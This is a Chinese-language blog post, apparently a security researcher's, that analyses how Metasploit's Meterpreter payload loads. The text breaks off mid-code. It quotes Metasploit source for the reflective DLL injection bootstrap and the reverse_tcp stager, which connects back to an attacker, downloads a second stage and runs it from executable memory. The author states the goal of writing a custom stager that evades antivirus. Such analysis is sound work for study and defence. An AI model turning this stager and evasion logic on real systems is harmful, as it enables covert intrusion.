@@ -1,0 +1,336 @@
+<!DOCTYPE HTML>
+<html class="no-js" lang="zh-CN">
+<!--
+//                            _ooOoo_
+//                           o8888888o
+//                           88" . "88
+//                           (| -_- |)
+//                            O\ = /O
+//                        ____/`---'\____
+//                      .   ' \\| |// `.
+//                       / \\||| : |||// \
+//                     / _||||| -:- |||||- \
+//                       | | \\\ - /// | |
+//                     | \_| ''\---/'' | |
+//                      \ .-\__ `-` ___/-. /
+//                   ___`. .' /--.--\ `. . __
+//                ."" '< `.___\_<|>_/___.' >'"".
+//               | | : `- \`.;`\ _ /`;.`/ - ` : | |
+//                 \ \ `-. \_ __\ /__ _/ .-` / /
+//         ======`-.____`-.___\_____/___.-`____.-'======
+//                            `=---='
+//                 拦截插件累计拦截逗比攻击"1381438"次！
+//         .............................................
+//                  佛祖保佑             永无BUG
+//          佛曰:
+//                  写字楼里写字间，写字间里程序员；
+//                  程序人员写程序，又拿程序换酒钱。
+//                  酒醒只在网上坐，酒醉还来网下眠；
+//                  酒醉酒醒日复日，网上网下年复年。
+//                  但愿老死电脑间，不愿鞠躬老板前；
+//                  奔驰宝马贵者趣，公交自行程序员。
+//                  别人笑我忒疯癫，我笑自己命太贱；
+//                  不见满街漂亮妹，哪个归得程序员？
+-->
+<head>
+    <!--[if lte IE 9]>
+<meta http-equiv="refresh" content="0;url=http://github.com/hucmosin/warn.html">
+<![endif]-->
+<meta charset="utf-8">
+
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
+<meta http-equiv="mobile-agent" content="format=html5; url=http://github.com/hucmosin">
+<meta name="author" content="Mosin">
+<link rel="stylesheet" href="//netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+<link rel="stylesheet" href="/css/SimpleStyle.min.css">
+
+<link rel="shortcut icon" href="/images/favicon.png">
+
+
+<title>meterpreter载荷执行原理分析 - Mosin&#39; Blog</title>
+
+<meta name="keywords" content="技术">
+
+<meta name="description " content="Learning, summarizing, thinking, feeling and knowledge management">
+</head>
+<body>
+<div id="nav">
+    <nav class="nav-menu">
+        <a class="site-name current" href="/" title="聊">聊</a>
+        <a class="site-index current" href="/"><i class="fa fa-home"></i><span>Home</span></a>
+        <a href="/archives" title="Archives"><i class="fa fa-archives"></i><span>Archives</span></a>
+        <!-- custom single page of menus -->
+        
+        
+        <a href="/help" title="帮助">
+            <i class="fa fa-question-circle"></i>
+            <span>帮助</span>
+        </a>
+        
+    </nav>
+</div>
+
+<div class="nav-user">
+    <a class="btn-search" href="#"><i class="fa fa-search"></i></a>
+    <a class="btn-read-mode" href="#"><i class="fa fa-sun-o"></i></a>
+    <a class="btn-weixin-mp" href="javascript:"><i class="fa fa-weixin"></i></a>
+</div>
+<div id="wrapper" class="clearfix">
+    <div id="body">
+        <div class="main" id="main">
+            <div id="cover">
+    <div class="cover-img"></div>
+    <div class="cover-info">
+        
+        <h1 class="cover-siteName">Mosin&#39;s Blog</h1>
+        <h3 class="cover-siteTitle">聊技术，谈情怀</h3>
+        <p class="cover-siteDesc">一个关注技术与人文的IT博客</p>
+        <div class="cover-sns">
+            
+            <div class="btn btn-github">
+                <a href="https://github.com/hucmosin" target="_blank" title="github" ref="friend">
+                    <i class="fa fa-github"></i>
+                </a>
+            </div>
+            
+        </div>
+    </div>
+</div>
+            <div class="page-title">
+    <ul>
+        <li><a href="/">最新</a></li>
+        
+            
+                <li class="">
+                    <a href="/categories/code-audit" data-name="审计">审计</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/technology" data-name="技术">技术</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/study-share" data-name="分享">分享</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/study-note" data-name="学习">学习</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/others-end" data-name="其他">其他</a>
+                </li>
+            
+        
+        <li class="page-search">
+    <form id="search" class="search-form">
+        <label for="s" class="sr-only">Input Search key Words Here</label>
+        <input class="search-field" type="text" name="s" class="text" placeholder="Input Search key Words Here" />
+        <button type="submit" class="search-form-submit" title="Search"><i class="fa fa-search"></i></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input"  placeholder="请输入关键字"/>   <!-- placeholder="Type something..."/>-->
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+</li>
+
+    </ul>
+</div>
+<div class="main-inner">
+    <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+        <div class="post-header">
+            <div class="post-author clearfix">
+                <a class="avatar fleft" href="https://github.com/hucmosin" target="_blank">
+                    <img width="48" src="/images/favicon.png" alt="avatar"/>
+                </a>
+                <p><span class="label">作者</span>
+                    <a href="https://github.com/hucmosin" target="_blank">mosin</a>
+                    <span title="最后编辑于2017-12-22">2017-12-22</span>
+                </p>
+                <p>灵魂无处安放,所以选择流浪</p>
+            </div>
+            <h2 class="post-title">Meterpreter载荷执行原理分析</h2>
+            <div class="post-meta">
+                本文总共17972个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
+            </div>
+        </div>
+        <div class="post-content markdown-body">
+            <h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p><strong>meterpreter是metsploit下的一个工具，是metsploit后渗透必不可少的，它具有强大的功能，包括socks代理，端口转发，键盘监听等多个功能，meterpreter可以说是内网渗透测试神器。</strong></p>
+<p>由于meterpreter_loader的加载有些问题，想自己改一下这个loader，并且自己也在写相关的工具，所以就对meterpreter进行了研究，一窥meterpreter的究竟。</p>
+<h3 id="0x01-meterpreter分析"><a href="#0x01-meterpreter分析" class="headerlink" title="0x01 meterpreter分析"></a>0x01 meterpreter分析</h3><p>meterpreter使用了大量的反射dll注入技术，meterpreter使用的反射dll不会在磁盘上留下任何文件，直接是载入内存的，所以有很好的躲避杀软的效果，但是meterpreter的stager文件就不太好过杀软了，一般来说都是做免杀处理，所以为了有更好的免杀效果和可移植性，我们自己来写stager是有那么点必要的。</p>
+<p>在metasploit里面,payloads简单可以分为三类:single,stager,stage.作用分别是single,实现单一,完整功能的payload,比如说bind_tcp这样的功能;stager和stage就像web入侵里面提到的小马和大马一样,由于exploit环境的限制,可能不能一下子把stage传过去,需要先传一个stager,stager在attacker和target之间建立网络连接,之后再把stage传过去进行下一步的行动。Reflective DLL Injection就是作为一个stage存在。也即是说,你已经有了和target之间的连接会话,你可以传送数据到target上，之后meterpreter与target之间的交互就都是和发送过去的反射dll进行交互。(在这里说个题外话，现在已经有杀软能够检测反射DLL的注入了，通过行为和内存，所以这种方式也不是特别好了，目前有种新技术就是直接执行远程主机的PE文件函数，根本不给杀软检测机会，这种技术我们以后再说。)</p>
+<p>当你已经获得了target上的shellcode执行权限,你的shellcode能够接收数据,写入内存并移交控制权(EIP)。</p>
+<p>下面看一下metasploit的meterpreter的payload。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">require &apos;msf/core/payload/windows/meterpreter_loader&apos;</span><br><span class="line">require &apos;msf/base/sessions/meterpreter_x86_win&apos;</span><br><span class="line">require &apos;msf/base/sessions/meterpreter_options&apos;</span><br><span class="line"></span><br><span class="line">module MetasploitModule</span><br><span class="line"></span><br><span class="line">  include Msf::Payload::Windows::MeterpreterLoader</span><br><span class="line">  include Msf::Sessions::MeterpreterOptions</span><br><span class="line"></span><br><span class="line">  def initialize(info = &#123;&#125;)</span><br><span class="line">    super(update_info(info,</span><br><span class="line">      &apos;Name&apos;          =&gt; &apos;Windows Meterpreter (Reflective Injection)&apos;,</span><br><span class="line">      &apos;Description&apos;   =&gt; &apos;Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged)&apos;,</span><br><span class="line">      &apos;Author&apos;        =&gt; [&apos;skape&apos;, &apos;sf&apos;, &apos;OJ Reeves&apos;],</span><br><span class="line">      &apos;PayloadCompat&apos; =&gt; &#123; &apos;Convention&apos; =&gt; &apos;sockedi handleedi http https&apos;&#125;,</span><br><span class="line">      &apos;License&apos;       =&gt; MSF_LICENSE,</span><br><span class="line">      &apos;Session&apos;       =&gt; Msf::Sessions::Meterpreter_x86_Win</span><br><span class="line">    ))</span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
+<p>这里他调用了meterpreter_loader.rb文件，在meterpreter_loader.rb文件中又引入了reflective_dll_loader.rb文件，reflective_dll_loader.rb主要是获取ReflectiveLoader()的偏移地址，用于重定位使用，没有什么可分析的。我们来到这个文件里reflectivedllinject.rb，这个文件主要是修复反射dll的，meterpreter_loader.rb文件主要是用于自身模块使用，修复dll和读取payload的长度的。</p>
+<p>我们定位/lib/msf/core/payload/windows/reflectivedllinject.rb 文件,这种修复方式在metsploit的高版本已被更新，新增的只是实现的技术上的简化，我们暂不关注。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">require &apos;msf/core&apos;</span><br><span class="line">require &apos;msf/core/reflective_dll_loader&apos;</span><br><span class="line">module Msf</span><br><span class="line">module Payload::Windows::ReflectiveDllInject</span><br><span class="line">  include Msf::ReflectiveDLLLoader</span><br><span class="line">  include Msf::Payload::Windows</span><br><span class="line">  def initialize(info = &#123;&#125;)</span><br><span class="line">    super(update_info(info,</span><br><span class="line">      &apos;Name&apos;          =&gt; &apos;Reflective DLL Injection&apos;,</span><br><span class="line">      &apos;Description&apos;   =&gt; &apos;Inject a DLL via a reflective loader&apos;,</span><br><span class="line">      &apos;Author&apos;        =&gt; [ &apos;sf&apos; ],</span><br><span class="line">      &apos;References&apos;    =&gt; [</span><br><span class="line">        [ &apos;URL&apos;, &apos;https://github.com/stephenfewer/ReflectiveDLLInjection&apos; ], # original</span><br><span class="line">        [ &apos;URL&apos;, &apos;https://github.com/rapid7/ReflectiveDLLInjection&apos; ] # customisations</span><br><span class="line">      ],</span><br><span class="line">      &apos;Platform&apos;      =&gt; &apos;win&apos;,</span><br><span class="line">      &apos;Arch&apos;          =&gt; ARCH_X86,</span><br><span class="line">      &apos;PayloadCompat&apos; =&gt; &#123; &apos;Convention&apos; =&gt; &apos;sockedi -https&apos;, &#125;,</span><br><span class="line">      &apos;Stage&apos;         =&gt; &#123; &apos;Payload&apos;   =&gt; &quot;&quot; &#125;</span><br><span class="line">      ))</span><br><span class="line">    register_options( [ OptPath.new( &apos;DLL&apos;, [ true, &quot;The local path to the Reflective DLL to upload&quot; ] ), ], self.class )</span><br><span class="line">  end</span><br><span class="line">  def library_path</span><br><span class="line">    datastore[&apos;DLL&apos;]</span><br><span class="line">  end</span><br><span class="line">  def asm_invoke_dll(opts=&#123;&#125;)</span><br><span class="line">    asm = %Q^</span><br><span class="line">        ; prologue</span><br><span class="line">          dec ebp               ; &apos;M&apos;</span><br><span class="line">          pop edx               ; &apos;Z&apos;</span><br><span class="line">          call $+5              ; call next instruction</span><br><span class="line">          pop ebx               ; get the current location (+7 bytes)</span><br><span class="line">          push edx              ; restore edx</span><br><span class="line">          inc ebp               ; restore ebp</span><br><span class="line">          push ebp              ; save ebp for later</span><br><span class="line">          mov ebp, esp          ; set up a new stack frame</span><br><span class="line">        ; Invoke ReflectiveLoader()</span><br><span class="line">          ; add the offset to ReflectiveLoader() (0x????????)</span><br><span class="line">          add ebx, #&#123;&quot;0x%.8x&quot; % (opts[:rdi_offset] - 7)&#125;</span><br><span class="line">          call ebx              ; invoke ReflectiveLoader()</span><br><span class="line">        ; Invoke DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)</span><br><span class="line">          push edi              ; push the socket handle</span><br><span class="line">          push 4                ; indicate that we have attached</span><br><span class="line">          push eax              ; push some arbitrary value for hInstance</span><br><span class="line">          mov ebx, eax          ; save DllMain for another call</span><br><span class="line">          call ebx              ; call DllMain(hInstance, DLL_METASPLOIT_ATTACH, socket)</span><br><span class="line">        ; Invoke DllMain(hInstance, DLL_METASPLOIT_DETACH, exitfunk)</span><br><span class="line">          ; push the exitfunk value onto the stack</span><br><span class="line">          push #&#123;&quot;0x%.8x&quot; % Msf::Payload::Windows.exit_types[opts[:exitfunk]]&#125;</span><br><span class="line">          push 5                ; indicate that we have detached</span><br><span class="line">          push eax              ; push some arbitrary value for hInstance</span><br><span class="line">          call ebx              ; call DllMain(hInstance, DLL_METASPLOIT_DETACH, exitfunk)</span><br><span class="line">    ^</span><br><span class="line">  end</span><br><span class="line">  def stage_payload(opts = &#123;&#125;)</span><br><span class="line">    # Exceptions will be thrown by the mixin if there are issues.</span><br><span class="line">    dll, offset = load_rdi_dll(library_path)</span><br><span class="line">    asm_opts = &#123;</span><br><span class="line">      rdi_offset: offset,</span><br><span class="line">      exitfunk:   &apos;thread&apos;  # default to &apos;thread&apos; for migration</span><br><span class="line">    &#125;</span><br><span class="line">    asm = asm_invoke_dll(asm_opts)</span><br><span class="line">    # generate the bootstrap asm</span><br><span class="line">    bootstrap = Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string</span><br><span class="line">    # sanity check bootstrap length to ensure we dont overwrite the DOS headers e_lfanew entry</span><br><span class="line">    if bootstrap.length &gt; 62</span><br><span class="line">      raise RuntimeError, &quot;Reflective DLL Injection (x86) generated an oversized bootstrap!&quot;</span><br><span class="line">    end</span><br><span class="line">    # patch the bootstrap code into the dll&apos;s DOS header...</span><br><span class="line">    dll[ 0, bootstrap.length ] = bootstrap</span><br><span class="line">    dll</span><br><span class="line">  end</span><br><span class="line">end</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
+<p>这里主要关注的有2个参数</p>
+<blockquote>
+<p>offset：ReflectiveLoader()的偏移地址</p>
+<p>exitfunk：dll的退出函数地址</p>
+</blockquote>
+<p>这2个参数是dll执行的关键，下面我们来分析下DOS头patch的代码。DOS头是可以被修改的，它只不过是微软为了兼容16位汇编而存在的产物，几乎没有什么用。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">dec ebp               ; &apos;M&apos;</span><br><span class="line">pop edx               ; &apos;Z&apos;</span><br><span class="line">call $+5              ; call next instruction</span><br><span class="line">pop ebx               ; get the current location (+7 bytes)</span><br><span class="line">push edx              ; restore edx</span><br><span class="line">inc ebp               ; restore ebp</span><br><span class="line">push ebp              ; save ebp for later</span><br><span class="line">mov ebp, esp          ; set up a new stack frame</span><br><span class="line">; Invoke ReflectiveLoader()</span><br><span class="line">; add the offset to ReflectiveLoader() (0x????????)</span><br><span class="line">add ebx, #&#123;&quot;0x%.8x&quot; % (opts[:rdi_offset] - 7)&#125;</span><br><span class="line">call ebx              ; invoke ReflectiveLoader()</span><br><span class="line">; Invoke DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)</span><br><span class="line">push edi              ; push the socket handle</span><br><span class="line">push 4                ; indicate that we have attached</span><br><span class="line">push eax              ; push some arbitrary value for hInstance</span><br><span class="line">mov ebx, eax          ; save DllMain for another call</span><br><span class="line">call ebx              ; call DllMain(hInstance, DLL_METASPLOIT_ATTACH, socket)</span><br><span class="line">; Invoke DllMain(hInstance, DLL_METASPLOIT_DETACH, exitfunk)</span><br><span class="line">; push the exitfunk value onto the stack</span><br><span class="line">push #&#123;&quot;0x%.8x&quot; % Msf::Payload::Windows.exit_types[opts[:exitfunk]]&#125;</span><br><span class="line">push 5                ; indicate that we have detached</span><br><span class="line">push eax              ; push some arbitrary value for hInstance</span><br><span class="line">call ebx              ; call DllMain(hInstance, DLL_METASPLOIT_DETACH, exitfunk)</span><br></pre></td></tr></table></figure>
+<p>meterpreter使用的dll是metsrv.dll（metsrv.dll分为x86和x64），程序在metsrv.dll里面写入Bootstrap,同时定位ReflectiveLoader()的地址,硬编码写入Bootstrap里面,同时加入退出函数的地址。</p>
+<p>这里有一个问题，如果将Bootstrap直接写入dll的头部是会破坏dll这个文件的结构（也就是PE结构），使之无法成为正常的PE文件，所以这里就用了一个技巧， MZ标志可以拿来做指令，dec ebp和pop edx,这两条指令的16进制刚好是MZ的ascii码,所以之后再加上其他相关代码，就可以不破坏DOS头的情况下对DOS头进行修改。</p>
+<blockquote>
+<p>“/x4D”                             # dec ebp             ; M</p>
+<p>“/x5A”                             # pop edx             ; Z</p>
+</blockquote>
+<p>像call和jmp+立即数的指令,立即数的计算都是(目标地址 - (当前地址 + 5)),</p>
+<blockquote>
+<p>call $+5              ; call next instruction</p>
+</blockquote>
+<p>在Bootstrap中完成代码重定向工作.看下Bootstrap的生成代码</p>
+<blockquote>
+<p>add ebx, #{“0x%.8x” % (opts[:rdi_offset] - 7)}</p>
+</blockquote>
+<p>其中的rdi_offset是Metsrv.dll编译好之后,ReflectiveLoader()函数在文件中的RVA相对虚拟地址,相对虚拟地址需要加上基址才是真实地址,这条指令里文件头部的偏移是7,只要将这个地址减去7那就是基址了,有了基址,加上RVA就得到了ReflectiveLoader()的地址了,有了地址直接call过去就完事了,ReflectiveLoader()没有参数,返回值是DlMain()的地址。</p>
+<blockquote>
+<p>push #{“0x%.8x” % Msf::Payload::Windows.exit_types[opts[:exitfunk]]}</p>
+</blockquote>
+<p>这个地方就是退出函数地址了exitfunk，DLL的退出主要分3种[‘THREAD’，‘PROCESS’，‘SEH’，[‘SLEEP’]]，</p>
+<blockquote>
+<p>push, edi</p>
+</blockquote>
+<p>edi是socket的值用来接收meterpreter过来的套接字用的,也就是用于保存套接字的。</p>
+<p>stager loader执行流程</p>
+<blockquote>
+<p>1.loader转移EIP到dll的文件头</p>
+<p>2.dll进行重定位</p>
+<p>3.计算ReflectiveLoader()地址</p>
+<p>4.调用ReflectiveLoader()</p>
+<p>5.得到DllMain()地址(前面调用的返回值)</p>
+<p>6.调用DllMain(),循环直到attacker退出</p>
+<p>7.第二次调用DllMain(),此时按退出函数安全退出.</p>
+</blockquote>
+<p>ReflectiveLoader()的具体实现过程:</p>
+<blockquote>
+<p>1.首先需要获取三个关键函数的地址.</p>
+<p>2.分配一块内存,把dll复制过去,不是一下子全部复制,而是分开头部和各个区块.</p>
+<p>3.处理IAT,再处理重定向表.</p>
+<p>4.使用DLL_PROCESS_ATTACH调用一次DllMain().</p>
+<p>5.返回DllMain()的地址供Bootstrap调用.</p>
+</blockquote>
+<p>好了，大概DOS头和DLL的处理就是这样，下面来看看metrepreter具体的交互过程。</p>
+<h3 id="0x02-Loader的执行分析"><a href="#0x02-Loader的执行分析" class="headerlink" title="0x02 Loader的执行分析"></a>0x02 Loader的执行分析</h3><p>首先，我们监听meterpreter，在本地对meterpreter进行连接，当连接上后，meterpreter会发送修复后的dll过来，我们把它给存储起来。</p>
+<p><img src="/allimage/meterload/1.png" alt="1"></p>
+<p>我们打开保存的meterpreter发送过来的dll文件。</p>
+<p>我们看到这个不是正常的PE文件，前面多了一个4字节的内容2E840D00，这4字节的内容其实就是缓冲区的大小，用于运行dll的大小空间，可以自行修改。随后就是熟悉的DOS头部，这个与原始的DLL文件头部不一致，我们可以来对比一下。</p>
+<p><img src="/allimage/meterload/2.jpg" alt="2"></p>
+<p>可以看到发送过来的DLL文件的DOS头的前37字节被修改了，前文已经说了，DOS头是可以被修改的，DOS头的大小为60字节，熟悉PE结构的朋友应该知道，随后就是PE头的定位地址，一般来讲PE头就在附近，地址一般不会超过2个字节，所以这个时候DOS头能被修改的字节就为DOS头加上2个字节的PE定位地址等于62个字节，剩下的就是2个字节的PE定位地址。</p>
+<p>我们可以看下文件代码，事实meterpreter动的手脚就是这个。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># sanity check bootstrap length to ensure we dont overwrite the DOS headers e_lfanew entry</span><br><span class="line">if bootstrap.length &gt; 62</span><br><span class="line">   raise RuntimeError, &quot;Reflective DLL Injection (x86) generated an oversized bootstrap!</span><br><span class="line"> end</span><br></pre></td></tr></table></figure>
+<p>我们抓包可以看到，meterpreter与本机建立连接后，分了两次发送DLL文件（其实是多次，只是第一次发送的并不是DLL文件而已），第一次发送了4字节缓冲区大小，也就是2E840D00。</p>
+<p><img src="/allimage/meterload/3.png" alt="3"></p>
+<p>第二次就是发送重定位后的dll文件了，一次肯定是发送不完了，所以分了多次发送。</p>
+<p><img src="/allimage/meterload/4.png" alt="1"></p>
+<p>根据上面分析得到的信息，我们可以断定loader的执行流程为</p>
+<blockquote>
+<p>1.首先接收4字节缓冲区大小</p>
+<p>2.开辟内存</p>
+<p>3.把我们的socket里的值复制到缓冲区中去</p>
+<p>4.读取字节到缓冲区</p>
+<p>5.执行DLLMain</p>
+<p>6.退出</p>
+</blockquote>
+<h3 id="0x03-loader构造"><a href="#0x03-loader构造" class="headerlink" title="0x03 loader构造"></a>0x03 loader构造</h3><p>以上分析证明流程确实这样的，可能与原来程序会有出入。</p>
+<p>我们来看看原来程序源码</p>
+<p>文件lib\msf\core\payload\windows\reverse_tcp.rb</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">.........省略无关代码</span><br><span class="line">reverse_tcp:</span><br><span class="line">        push &apos;32&apos;               ; Push the bytes &apos;ws2_32&apos;,0,0 onto the stack.</span><br><span class="line">        push &apos;ws2_&apos;             ; ...</span><br><span class="line">        push esp                ; Push a pointer to the &quot;ws2_32&quot; string on the stack.</span><br><span class="line">        push #&#123;Rex::Text.block_api_hash(&apos;kernel32.dll&apos;, &apos;LoadLibraryA&apos;)&#125;</span><br><span class="line">        call ebp                ; LoadLibraryA( &quot;ws2_32&quot; )</span><br><span class="line">        mov eax, 0x0190         ; EAX = sizeof( struct WSAData )</span><br><span class="line">        sub esp, eax            ; alloc some space for the WSAData structure</span><br><span class="line">        push esp                ; push a pointer to this stuct</span><br><span class="line">        push eax                ; push the wVersionRequested parameter</span><br><span class="line">        push #&#123;Rex::Text.block_api_hash(&apos;ws2_32.dll&apos;, &apos;WSAStartup&apos;)&#125;</span><br><span class="line">        call ebp                ; WSAStartup( 0x0190, &amp;WSAData );</span><br><span class="line">set_address:</span><br><span class="line">        push #&#123;retry_count&#125;     ; retry counter</span><br><span class="line">create_socket:</span><br><span class="line">        push #&#123;encoded_host&#125;    ; host in little-endian format</span><br><span class="line">        push #&#123;encoded_port&#125;    ; family AF_INET and port number</span><br><span class="line">        mov esi, esp            ; save pointer to sockaddr struct</span><br><span class="line">        push eax                ; if we succeed, eax will be zero, push zero for the flags param.</span><br><span class="line">        push eax                ; push null for reserved parameter</span><br><span class="line">        push eax                ; we do not specify a WSAPROTOCOL_INFO structure</span><br><span class="line">        push eax                ; we do not specify a protocol</span><br><span class="line">        inc eax                 ;</span><br><span class="line">        push eax                ; push SOCK_STREAM</span><br><span class="line">        inc eax                 ;</span><br><span class="line">        push eax                ; push AF_INET</span><br><span class="line">        push #&#123;Rex::Text.block_api_hash(&apos;ws2_32.dll&apos;, &apos;WSASocketA&apos;)&#125;</span><br><span class="line">        call ebp                ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );</span><br><span class="line">        xchg edi, eax           ; save the socket for later, don&apos;t care about the value of eax after this</span><br><span class="line">try_connect:</span><br><span class="line">        push 16                 ; length of the sockaddr struct</span><br><span class="line">        push esi                ; pointer to the sockaddr struct</span><br><span class="line">        push edi                ; the socket</span><br><span class="line">        push #&#123;Rex::Text.block_api_hash(&apos;ws2_32.dll&apos;, &apos;connect&apos;)&#125;</span><br><span class="line">        call ebp                ; connect( s, &amp;sockaddr, 16 );</span><br><span class="line">        test eax,eax            ; non-zero means a failure</span><br><span class="line">        jz connected</span><br><span class="line">handle_connect_failure:</span><br><span class="line">        ; decrement our attempt count and try again</span><br><span class="line">        dec dword [esi+8]</span><br><span class="line">        jnz try_connect</span><br><span class="line">.........省略无关代码</span><br><span class="line"> recv:</span><br><span class="line">        ; Receive the size of the incoming second stage...</span><br><span class="line">        push 0                  ; flags</span><br><span class="line">        push 4                  ; length = sizeof( DWORD );</span><br><span class="line">        push esi                ; the 4 byte buffer on the stack to hold the second stage length</span><br><span class="line">        push edi                ; the saved socket</span><br><span class="line">        push #&#123;Rex::Text.block_api_hash(&apos;ws2_32.dll&apos;, &apos;recv&apos;)&#125;</span><br><span class="line">        call ebp                ; recv( s, &amp;dwLength, 4, 0 );</span><br><span class="line">.........省略无关代码</span><br><span class="line">        ; Alloc a RWX buffer for the second stage</span><br><span class="line">        mov esi, [esi]          ; dereference the pointer to the second stage length</span><br><span class="line">        push 0x40               ; PAGE_EXECUTE_READWRITE</span><br><span class="line">        push 0x1000             ; MEM_COMMIT</span><br><span class="line">        push esi                ; push the newly recieved second stage length.</span><br><span class="line">        push 0                  ; NULL as we dont care where the allocation is.</span><br><span class="line">        push #&#123;Rex::Text.block_api_hash(&apos;kernel32.dll&apos;, 